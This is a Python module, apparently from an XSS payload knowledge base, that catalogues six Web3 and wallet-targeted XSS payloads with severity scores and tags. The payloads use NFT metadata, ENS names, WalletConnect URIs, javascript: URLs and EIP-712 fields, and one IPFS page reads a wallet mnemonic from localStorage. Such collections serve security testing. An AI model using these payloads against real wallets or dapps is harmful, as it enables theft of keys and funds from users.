#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Web3 and Blockchain XSS Payloads
"""

from ..models import PayloadEntry

WEB3_PAYLOADS = {
    "nft_metadata_xss": PayloadEntry(
        payload='{"name": "<img src=x onerror=alert(1)>", "description": "Safe NFT"}',
        contexts=["json", "wallet"],
        severity="critical",
        cvss_score=8.8,
        description="Malicious NFT metadata injecting HTML into wallet UI",
        tags=["web3", "nft", "metadata", "json"],
        browser_support=["all"],
        reliability="high",
        attack_surface="wallet"
    ),
    "ens_domain_xss": PayloadEntry(
        payload='<script>alert(document.domain)</script>.eth',
        contexts=["wallet", "html_content"],
        severity="high",
        cvss_score=7.5,
        description="ENS Domain XSS payload",
        tags=["web3", "ens", "domain"],
        browser_support=["all"],
        reliability="medium",
        attack_surface="dapp"
    ),
    "ipfs_gateway_html": PayloadEntry(
        payload='<html><head></head><body><script>alert(localStorage.getItem("mnemonic"))</script></body></html>',
        contexts=["ipfs_gateway", "html_content"],
        severity="critical",
        cvss_score=9.1,
        description="IPFS hosted malicious HTML to steal mnemonics/keys",
        tags=["web3", "ipfs", "phishing", "exfiltration"],
        browser_support=["all"],
        reliability="high",
        attack_surface="gateway"
    ),
    "wallet_connect_uri": PayloadEntry(
        payload='wc:8a5e5bdc-a0e4-47...<script>alert(1)</script>@1',
        contexts=["url", "wallet"],
        severity="medium",
        cvss_score=6.1,
        description="WalletConnect URI injection",
        tags=["web3", "walletconnect", "uri"],
        browser_support=["mobile"],
        reliability="low",
        attack_surface="deep-link"
    ),
    "smart_contract_string_return": PayloadEntry(
        payload='javascript:alert(1)',
        contexts=["web3_dapp", "url"],
        severity="high",
        cvss_score=7.5,
        description="Smart contract returning javascript: protocol in URL field",
        tags=["web3", "smart-contract", "protocol"],
        browser_support=["all"],
        reliability="high",
        attack_surface="dapp"
    ),
    "metamask_sign_typed_data": PayloadEntry(
        payload='{"types":{"EIP712Domain":[{"name":"<img src=x onerror=alert(1)>","type":"string"}]}}',
        contexts=["wallet", "json"],
        severity="high",
        cvss_score=8.1,
        description="EIP-712 Typed Data signing prompt injection",
        tags=["web3", "eip712", "metamask", "signing"],
        browser_support=["chrome", "firefox"],
        reliability="medium",
        attack_surface="wallet"
    )
}

WEB3_TOTAL = len(WEB3_PAYLOADS)
